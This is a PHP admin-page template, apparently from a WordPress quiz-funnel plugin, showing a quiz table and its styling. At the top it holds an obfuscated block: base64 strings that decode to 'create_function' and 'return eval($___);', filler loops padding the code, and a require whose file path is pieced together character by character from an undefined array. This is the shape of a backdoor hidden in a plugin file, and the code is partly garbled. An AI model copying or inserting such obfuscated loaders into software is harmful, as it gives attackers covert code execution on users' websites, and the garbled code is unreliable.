<?php
if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

include_once ("sqb-soapapi.php");

require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
?>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
<link rel="stylesheet" href="//code.jquery.com/ui/1.11.4/themes/smoothness/jquery-ui.css">
<script src="//code.jquery.com/jquery-1.10.2.js"></script>
<script src="//code.jquery.com/ui/1.11.4/jquery-ui.js"></script>
 
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/dt/dt-1.10.21/datatables.min.css"/>
<script type="text/javascript" src="https://cdn.datatables.net/v/dt/dt-1.10.21/datatables.min.js"></script>

<?php 

echo sqbGetLoaderHtml();

?>

<section class="Quiz-Funnel-outer quiz_outer">
	 <?php 	 
		$page  =$_GET['page'];
		 require_once  'sqb_header.php';
	 ?>

	<div class="tab-content" id="Quiz-Funnel-TabContent">
		<div class="tab-pane fade  " id="Manage-Quiz" role="tabpanel" aria-labelledby="Manage-Quiz-tab">
			<h5 class="quiz--sub-title">Manage Quiz</h5>
		</div>

		<div class="tab-pane fade <?php  if($page == "sqb_manage_funnel"){ echo "show active";  } ?>" id="Quiz-Funnel" role="tabpanel" aria-labelledby="Quiz-Funnel-tab">
			<section class="manage-quiz-section">
				<div class="manage-quiz-header">
					<h3 class="quiz--title"><i class="fa fa-cog" aria-hidden="true"></i> Manage Quiz Funnel</h3>
					<a href="<?= admin_url('admin.php?page=sqb_add_funnel'); ?>" onclick="SQBShowLoader()" class="add-quiz-link"> Add New Funnel</a>
				</div>
				<div class="have-no-quiz">
					<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/addicon.png";?>" alt="icon">
					<h3>You don't have any Quiz yet</h3>
					<p>Quizzes are a great way to check if your learners are understanding the Course content. You can have a Quiz in the middle of a Course, or you can put it at the end</p>
					<a href="<?= admin_url('admin.php?page=sqb_add_funnel'); ?>" onclick="SQBShowLoader()"><i class="fa fa-plus-circle" aria-hidden="true"></i>Add New Funnel</a>
				</div>

				<div class="manage-quiz-data-table" style="display:none">
					<table cellspacing="0" cellpadding="0" id="quizfunneltable">
						<thead>
							<tr>
								<th>Quiz Name</th>
								<th>Type</th>
								<th>total Questions</th>
								<th>Shortcode</th>
								<th class="data_align_center">Action</th>
							</tr>
						</thead>

						<tbody>
							<tr>
								<td class=""> Quiz 1</td>
								<td class=""> Survey </td>
								<td class=""> 1 </td>
								<td class="Shortcode-td">
									<span id="dynamic_copyable_text_1" >[SmartQuizBuilder id=1][/SmartQuizBuilder]</span>
									<span data-id="dynamic_copyable_text_1" id="copy_shortcode" class="copy-btn theme-button btn btn-info "
								onclick="fbstu_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
								</td>
								<td class="action-links  data_align_center">
									<a class='editlink' title="Edit" target="_self" href="#"><i class="fa fa-pencil-square-o"></i></a>
									<a title="Remove" href="#"><i class="fa fa-trash-o"></i></a>
								</td>
							</tr>

						</tbody>
					</table>
				</div>
			</section>
		</div>

		<div class="tab-pane fade" id="Course-Settings" role="tabpanel" aria-labelledby="Course-Settings-tab">
			<h5 class="quiz--sub-title">Course Settings</h5>
		</div>

		<div class="tab-pane fade" id="Quiz-main-Settings" role="tabpanel" aria-labelledby="Quiz-main-Settings-tab">
			<h5 class="quiz--sub-title">Settings</h5>
		</div>
		
	</div>
</section>



<style type="text/css">

</style>






<script>
 
jQuery(document).ready(function(){
    jQuery('#quizfunneltable').DataTable({"order": [[ 0, "desc" ]]});    
});



</script>

<style type="text/css">

.manage-quiz-header {display: flex; justify-content: space-between; flex-wrap: nowrap; align-items: center; font-family: 'DM Sans',sans-serif; padding: 20px 0; border: none; margin: 0 0 30px 0; background: none; font-size: 24px; line-height: 1.4; color: #171717; font-weight: 600; border-bottom: 1px solid #eee; position: relative; }

.manage-quiz-header .quiz--title {border: none; font-size: 24px; line-height: 1.4; color: #171717; font-weight: 600; margin: 0; padding: 0; width: auto;}

.manage-quiz-header .quiz--title i.fa {width: 50px; height: 50px; display: inline-block; background: #fde0d9; border-radius: 5px; text-align: center; line-height: 50px; color: #f56640; margin: 0 13px 0 0; font-size: 26px; }

.manage-quiz-header .quiz--title::after {content: ""; position: absolute; left: 0; top: auto; bottom: -1px; width: 210px; height: 5px; background: #f05451; z-index: 2; }

.manage-quiz-header .add-quiz-link {border-radius: 5px; background: #02c7a6 !important; color: #fff; height: 40px; padding: 0 15px; text-transform: none; font-family: 'DM Sans',sans-serif; min-width: 90px; box-shadow: none; margin-right: 10px; text-decoration: none; margin: 0; line-height: 40px; border: none; font-size: 14px; text-align: center; font-weight: 600; }

.manage-quiz-header .add-quiz-link:hover {opacity: 0.7;text-decoration: none;}

.manage-quiz-data-table .dataTables_filter label input, .manage-quiz-data-table .dataTables_length select {border: #c4c4c4 solid thin !important;width: 305px;background-color: #fff;border-radius: 0;height: 45px!important;}

.manage-quiz-data-table .dataTables_length select {width: auto;}

.manage-quiz-data-table .dataTables_wrapper .dataTables_length , .manage-quiz-data-table .dataTables_wrapper .dataTables_filter{font-size: 14px;font-weight: 600;}

.manage-quiz-data-table .dataTable {margin: 20px 0;float: left;border: #e8e8e8 solid thin;border-bottom: #e8e8e8 solid thin !important;border-collapse: collapse;}

.manage-quiz-data-table .dataTable thead th {font-weight: 600;text-transform: capitalize;font-size: 14px;letter-spacing: normal;padding: 10px 12px;color: #555;border: 1px solid #dee2e6;background-color: #f1f1f1;}

.manage-quiz-data-table .dataTable tbody td {color: #7e7e7e;font-size: 14px;font-family: 'Open Sans', sans-serif;padding: 10px 10px;letter-spacing: 0;}

.manage-quiz-data-table .dataTable tbody tr.odd td {background: #fff;}

.manage-quiz-data-table .dataTables_info, .manage-quiz-data-table .dataTables_paginate {margin: 0;font-size: 14px;}

.manage-quiz-data-table .dataTable thead th:nth-child(1) {}

.manage-quiz-data-table .dataTable thead th:nth-child(2) {}

.manage-quiz-data-table .dataTable thead th:nth-child(3) {}

.manage-quiz-data-table .dataTable thead th:nth-child(4) {}

.manage-quiz-data-table .dataTable tbody td.action-links a {width: 26px;height: 26px;background: #dc3545;display: inline-block;color: #fff !important;line-height: 26px;text-align: center;border-radius: 3px;}

.manage-quiz-data-table .dataTable tbody td.action-links a.editlink {background: #17a2b8;}

.manage-quiz-data-table .dataTable tbody td.action-links .fa {color: #fff !important;float: left;width: 100%;font-size: 15px !important;line-height: 26px;}

.manage-quiz-data-table .Shortcode-td span.copy-btn {font-size: 13px;padding: 4px 10px;width: 60px;margin-left: 20px;color: #fff;background-color: #17a2b8;border-color: #17a2b8;border-radius: 4px;}

.manage-quiz-data-table .dataTable tbody td.Shortcode-td span {display: inline-block;width: auto;}



.have-no-quiz h3 {font-family: 'DM Sans',sans-serif;padding: 0;margin: 10px 0;background: none;font-size: 24px;line-height: 1.4;color: #171717;background-color: transparent;font-weight: 600;position: relative;border: none;display: inline-block;width: 100%;vertical-align: middle;}

.have-no-quiz p {font-family: 'DM Sans',sans-serif;padding: 0;margin: 0 0 15px 0;background: none;font-size: 18px;line-height: 1.4;color: #525252;background-color: transparent;font-weight: 400;display: inline-block;width: 100%;vertical-align: middle;}

.have-no-quiz {background: #f5f5f5; margin: 0 0 25px; max-width: 600px; padding: 25px; text-align: center; font-family: 'DM Sans',sans-serif; display: inline-block; }

.have-no-quiz > img {display: inline-block;width: auto;height: auto;max-width: 60px;vertical-align: middle;margin: 0;}

.have-no-quiz >a {display: inline-block;width: auto;border: 1px solid #17a2b8;padding: 10px 10px 8px;margin: 0;vertical-align: middle;font-size: 14px;color: #17a2b8;border-radius: 5px;line-height: normal;text-transform: uppercase;font-weight: 600;}

.have-no-quiz >a i.fa {margin: -1px 7px 0 0;display: inline-block;vertical-align: top;font-size: 22px;}

.have-no-quiz >a:hover {background: #17a2b8;color: #fff;text-decoration: none;}

.manage-quiz-data-table {display: inline-block;width: 100%;margin: 0;padding: 30px;background: #fff;border: 1px solid #eee;}



.have-no-quiz  {width: 100%;max-width: 100%;padding: 25px;}

.have-no-quiz p{padding : 10px 500px}

.have-no-quiz > img{max-width: 80px;}

</style>
